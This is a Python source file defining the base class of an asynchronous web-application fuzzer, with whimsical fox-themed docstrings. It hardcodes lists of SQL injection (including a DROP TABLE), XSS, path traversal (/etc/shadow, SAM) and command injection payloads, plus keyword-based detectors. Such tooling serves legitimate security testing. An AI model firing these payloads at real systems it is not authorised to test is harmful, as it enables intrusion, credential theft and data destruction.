"""
Base Fuzzer - The Strategic Foundation

The foundational fuzzer class that provides all the common functionality needed by specialized fuzzers. This is the core module where all the strategic patterns and utilities are defined.
"""

import asyncio
import time
from abc import ABC, abstractmethod
from typing import Any

import httpx
from rich.console import Console
from rich.panel import Panel

from .results import FuzzResult

console = Console()


class BaseFuzzer(ABC):
    """
    Base Fuzzer - Strategic Foundation for All Fuzzing Operations

    This is the foundational class that provides all the common patterns, utilities, and strategic approaches that specialized fuzzers need. This class provides multiple ways to approach any fuzzing challenge.

    Attributes:
        base_url (str): Base URL for fuzzing targets
        max_concurrent (int): Maximum concurrent requests
        session (httpx.AsyncClient): HTTP client for requests
        results (List[FuzzResult]): Collected fuzzing results

    Example:
        >>> class MySpecializedFuzzer(BaseFuzzer):
        ...     async def fuzz_specific_endpoint(self):
        ...         return await self._send_request("/api/endpoint", "GET")
    """

    def __init__(
        self, base_url: str = "http://localhost:8000", max_concurrent: int = 10
    ):
        """
        Initialize the base fuzzer with strategic configuration.

        *fox ears perk with anticipation* Sets up the foundation for
        all fuzzing operations with proper concurrency control and
        session management.

        Args:
            base_url (str): Base URL for fuzzing targets
            max_concurrent (int): Maximum concurrent requests
        """
        self.base_url = base_url.rstrip("/")
        self.max_concurrent = max_concurrent
        self.session = httpx.AsyncClient(timeout=30.0)
        self.results: list[FuzzResult] = []
        self._semaphore = asyncio.Semaphore(max_concurrent)

    async def __aenter__(self):
        """Async context manager entry - the fox enters the den."""
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit - the fox leaves gracefully."""
        await self.session.aclose()

    async def _send_request(self, url: str, method: str, **kwargs) -> FuzzResult:
        """
        Send a request with strategic vulnerability analysis.

        *whiskers twitch with cunning* This is the core method that all
        specialized fuzzers use. It provides consistent request handling,
        timing, and vulnerability analysis across all fuzzing operations.

        Args:
            url (str): Target URL for the request
            method (str): HTTP method to use
            **kwargs: Additional request parameters (json, params, headers, etc.)

        Returns:
            FuzzResult: Comprehensive result with vulnerability analysis
        """
        start_time = time.time()

        try:
            async with self._semaphore:
                response = await self.session.request(method, url, **kwargs)
            end_time = time.time()

            # Analyze response for vulnerabilities using specialized logic
            vulnerability_detected, vulnerability_type = self._analyze_response(
                response, kwargs
            )

            result = FuzzResult(
                url=url,
                method=method,
                payload=str(kwargs),
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type,
                response_body=response.text,
                response_text=response.text,
                response_headers=dict(response.headers),
                request_headers=kwargs.get("headers"),
            )

            self.results.append(result)
            return result

        except Exception as e:
            end_time = time.time()
            result = FuzzResult(
                url=url,
                method=method,
                payload=str(kwargs),
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e),
                response_body=None,
                response_text=None,
                response_headers=None,
                request_headers=kwargs.get("headers"),
            )

            self.results.append(result)
            return result

    @abstractmethod
    def _analyze_response(
        self, response: httpx.Response, request_kwargs: dict
    ) -> tuple[bool, str | None]:
        """
        Analyze response for vulnerabilities - specialized by fuzzer type.

        *fox intelligence shines* Each specialized fuzzer implements this
        method to provide domain-specific vulnerability analysis. This is
        where the cunning of each fuzzer type is applied.

        Args:
            response (httpx.Response): HTTP response to analyze
            request_kwargs (dict): Original request parameters

        Returns:
            Tuple[bool, Optional[str]]: (vulnerability_detected, vulnerability_type)
        """
        pass

    def _get_common_sql_payloads(self) -> list[str]:
        """
        Get common SQL injection payloads.

        *fox cunning at work* Provides the standard SQL injection
        payloads that are used across multiple fuzzer types.

        Returns:
            List[str]: Common SQL injection payloads
        """
        return [
            "' OR 1=1 --",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "' or '1'='1",
            "' OR 1=1 LIMIT 1--",
            "admin' OR 'x'='x",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users; --",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--",
            "' OR 1=1 UNION SELECT 1,2,3--",
            "' OR 1=1 AND 1=1--",
            "' OR 1=1 OR 1=1--",
            "' OR 1=1 /*",
            "' OR 1=1 #",
        ]

    def _get_common_xss_payloads(self) -> list[str]:
        """
        Get common XSS payloads.

        *fox stealth in action* Provides the standard XSS payloads
        that are used across multiple fuzzer types.

        Returns:
            List[str]: Common XSS payloads
        """
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
        ]

    def _get_common_path_traversal_payloads(self) -> list[str]:
        """
        Get common path traversal payloads.

        *fox navigation skills* Provides the standard path traversal
        payloads that are used across multiple fuzzer types.

        Returns:
            List[str]: Common path traversal payloads
        """
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/cmdline",
            "../../../var/log/auth.log",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\services",
            "../../../etc/hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\protocols",
            "../../../etc/group",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
            "../../../etc/sudoers",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.allow",
            "../../../etc/crontab",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.deny",
        ]

    def _get_common_command_injection_payloads(self) -> list[str]:
        """
        Get common command injection payloads.

        *fox hunting instincts* Provides the standard command injection
        payloads that are used across multiple fuzzer types.

        Returns:
            List[str]: Common command injection payloads
        """
        return [
            "; ls -la",
            "| whoami",
            "` id `",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "` cat /etc/passwd `",
            "$(cat /etc/passwd)",
            "; uname -a",
            "| uname -a",
            "` uname -a `",
            "$(uname -a)",
            "; ps aux",
            "| ps aux",
            "` ps aux `",
            "$(ps aux)",
            "; netstat -an",
            "| netstat -an",
            "` netstat -an `",
            "$(netstat -an)",
        ]

    def _get_common_boolean_parameters(self) -> list[dict[str, str]]:
        """
        Get common boolean parameter variations.

        *fox adaptability* Provides standard boolean parameter variations
        that are commonly tested across different endpoint types.

        Returns:
            List[Dict[str, str]]: Common boolean parameter variations
        """
        return [
            {"value": "true"},
            {"value": "false"},
            {"value": "1"},
            {"value": "0"},
            {"value": "null"},
            {"value": "undefined"},
            {"value": "' OR 1=1 --"},
            {"value": "<script>alert('XSS')</script>"},
        ]

    def _get_common_format_parameters(self) -> list[dict[str, str]]:
        """
        Get common format parameter variations.

        *fox versatility* Provides standard format parameter variations
        that are commonly tested across different endpoint types.

        Returns:
            List[Dict[str, str]]: Common format parameter variations
        """
        return [
            {"format": "json"},
            {"format": "xml"},
            {"format": "csv"},
            {"format": "' OR 1=1 --"},
            {"format": "<script>alert('XSS')</script>"},
        ]

    def _detect_common_vulnerabilities(
        self, response_text: str
    ) -> tuple[bool, str | None]:
        """
        Detect common vulnerabilities in response text.

        *fox pattern recognition* Analyzes response text for common
        vulnerability indicators that apply across all fuzzer types.

        Args:
            response_text (str): Response text to analyze

        Returns:
            Tuple[bool, Optional[str]]: (vulnerability_detected, vulnerability_type)
        """
        response_lower = response_text.lower()

        # Check for SQL injection
        if any(
            indicator in response_lower
            for indicator in ["sql syntax", "mysql", "database error", "postgresql"]
        ):
            return True, "SQL Injection"

        # Check for XSS
        if any(
            indicator in response_lower
            for indicator in ["<script>", "javascript:", "onerror="]
        ):
            return True, "XSS"

        # Check for path traversal
        if any(
            indicator in response_lower
            for indicator in ["root:", "etc:", "windows", "system32"]
        ):
            return True, "Path Traversal"

        # Check for command injection
        if any(
            indicator in response_lower
            for indicator in [
                "command not found",
                "permission denied",
                "whoami:",
                "ls:",
            ]
        ):
            return True, "Command Injection"

        # Check for information disclosure
        if any(
            indicator in response_lower
            for indicator in ["stack trace", "exception", "error in", "warning:"]
        ):
            return True, "Information Disclosure"

        return False, None

    def print_fuzzing_header(self, title: str, description: str):
        """
        Print a standardized fuzzing header.

        *fox presentation skills* Provides consistent, professional
        headers for all fuzzing operations.

        Args:
            title (str): Title for the fuzzing operation
            description (str): Description of what's being fuzzed
        """
        console.print(
            Panel.fit(
                f"[bold red]🐺 {title}[/bold red]\n"
                f"*snarls with predatory glee* {description}",
                border_style="red",
            )
        )

    def print_endpoint_progress(self, method: str, endpoint: str):
        """
        Print standardized endpoint progress.

        *fox tracking skills* Provides consistent progress reporting
        for fuzzing operations.

        Args:
            method (str): HTTP method being used
            endpoint (str): Endpoint being fuzzed
        """
        console.print(f"🔍 Fuzzing {method} {endpoint}")

    def get_results_summary(self) -> dict[str, Any]:
        """
        Get a summary of fuzzing results.

        *fox analytical mind* Provides comprehensive analysis of
        all collected fuzzing results.

        Returns:
            Dict[str, Any]: Summary statistics and analysis
        """
        if not self.results:
            return {"total_requests": 0, "vulnerabilities_found": 0}

        total_requests = len(self.results)
        successful_requests = len([r for r in self.results if r.status_code > 0])
        vulnerabilities_found = len(
            [r for r in self.results if r.vulnerability_detected]
        )
        errors = len([r for r in self.results if r.error])

        # Group vulnerabilities by type
        vuln_types = {}
        for result in self.results:
            if result.vulnerability_detected and result.vulnerability_type:
                if result.vulnerability_type not in vuln_types:
                    vuln_types[result.vulnerability_type] = 0
                vuln_types[result.vulnerability_type] += 1

        return {
            "total_requests": total_requests,
            "successful_requests": successful_requests,
            "vulnerabilities_found": vulnerabilities_found,
            "errors": errors,
            "vulnerability_types": vuln_types,
            "success_rate": (
                (successful_requests / total_requests) * 100
                if total_requests > 0
                else 0
            ),
            "vulnerability_rate": (
                (vulnerabilities_found / total_requests) * 100
                if total_requests > 0
                else 0
            ),
        }
